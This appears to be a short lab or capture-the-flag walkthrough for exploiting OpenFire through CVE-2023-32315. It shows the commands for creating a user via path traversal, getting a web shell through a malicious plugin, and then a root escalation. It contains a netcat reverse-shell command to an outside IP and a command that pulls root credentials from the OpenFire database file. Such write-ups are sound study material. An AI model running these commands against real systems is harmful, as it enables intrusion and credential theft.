#box

*Created: 1/18/2026*

### Step 1

**Tags:** #Path-Traversal #Web-Applications #Authentication-Bypass #RCE #OpenFire #OpenFire-Plugin #Reverse-Shell #Web-Shell

🔗 **URL/Link:** https://github.com/miko550/CVE-2023-32315

**Command:**
```bash
# Creates the user
python3 CVE-2023-32315.py -t http://192.168.184.96:9090

# Follow the following link to understand how to upload the malicious plugin and gain a webshell
https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce#:~:text=Reproduce%20The%20Vulnerability

# Finally, we get a shell with busybox
busybox nc 192.168.45.192 9090 -e /bin/sh
```

> 
> The machine exposes on port 9090 / 9091 (HTTP/HTTPS) an instance of OpenFire. We discover that OpenFire is vulnerable to a two-step exploit [CVE-2023-32315](https://github.com/miko550/CVE-2023-32315). This vulnerability consists in the creation of an user through a Path Traversal vulnerability on the login page and on obtaining RCE through the upload of a malicious plugin that grants us a webshell

---

### Step 2

**Tags:** #Credential-Hunting #OpenFire

**Command:**
```bash
cat /usr/share/openfire/embedded-db/openfire.script | grep password -C 5
```

> 
> To gain Privilege Escalation we'll have to seek for `root` credentials inside a file located at `/usr/share/openfire/embedded-db/openfire.script`. This will grant us access as root.

---

